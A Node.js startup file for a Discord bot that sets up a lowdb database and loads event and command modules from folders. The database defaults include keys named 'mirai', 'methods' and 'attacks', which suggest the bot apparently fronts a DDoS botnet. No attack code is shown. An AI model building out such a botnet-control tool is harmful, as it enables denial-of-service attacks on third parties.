const Discord = require('discord.js');
const client = new Discord.Client();
const fs = require('fs');
const logger = require('./utils/logger');

require('dotenv').config();

const low = require('lowdb')
const FileSync = require('lowdb/adapters/FileSync')

const adapter = new FileSync('db.json')
const db = low(adapter)

db.defaults({ methods: [], mirai: {}, attacks: [] }).write();

client.database = db;
client.commands = new Discord.Collection();

fs.readdir('./events/', (err, files) => {
    if (err) {
        return logger.log(3, 'Error in events folder!');
    }

    if (!files.length) {
        logger.log(2, 'Events not found!');
    }

    files.forEach(file => {
        let eventFunc = require(`./events/${file}`);
        let eventName = file.split('.')[0];
        client.on(eventName, (...args) => eventFunc.run(client, ...args));
    });
});

fs.readdir('./commands/', (err, files) => {
    if (err) {
        return logger.log(3, 'Error in commands folder!');
    }

    if (!files.length) {
        logger.log(2, 'Commands not found!');
    }

    files.forEach(file => {
        let commandFunc = require(`./commands/${file}`);
        let commandName = file.split('.')[0];
        client.commands.set(commandName, commandFunc);
    });
});

client.login(process.env.BOT_TOKEN).catch(err => logger.log(3, 'Discord login error!'));